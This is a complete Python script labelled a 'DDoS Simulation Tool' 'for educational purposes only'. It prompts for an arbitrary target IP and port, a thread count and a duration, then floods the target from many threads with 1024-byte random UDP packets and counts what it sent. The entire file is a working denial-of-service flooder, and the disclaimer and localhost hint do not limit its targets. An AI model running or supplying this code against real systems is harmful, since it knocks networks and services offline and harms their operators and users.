import socket
import threading
import time
import random

target_ip = None
target_port = None
attack_running = False
packet_count = 0

def attack():
    global packet_count
    while attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            packet_count += 1
        except:
            pass

def main():
    global target_ip, target_port, attack_running, packet_count

    print("=== DDoS Simulation Tool ===")
    print("For educational purposes only.\n")

    target_ip = input("Enter target IP (use 127.0.0.1 for localhost): ")
    target_port = int(input("Enter target port: "))
    thread_count = int(input("Enter number of threads: "))
    duration = int(input("Enter duration in seconds: "))

    print(f"\nLaunching simulation against {target_ip}:{target_port}")
    print(f"Threads: {thread_count} | Duration: {duration}s\n")

    attack_running = True
    threads = []

    for i in range(thread_count):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

    time.sleep(duration)
    attack_running = False

    print(f"Simulation complete.")
    print(f"Total packets sent: {packet_count}")

main()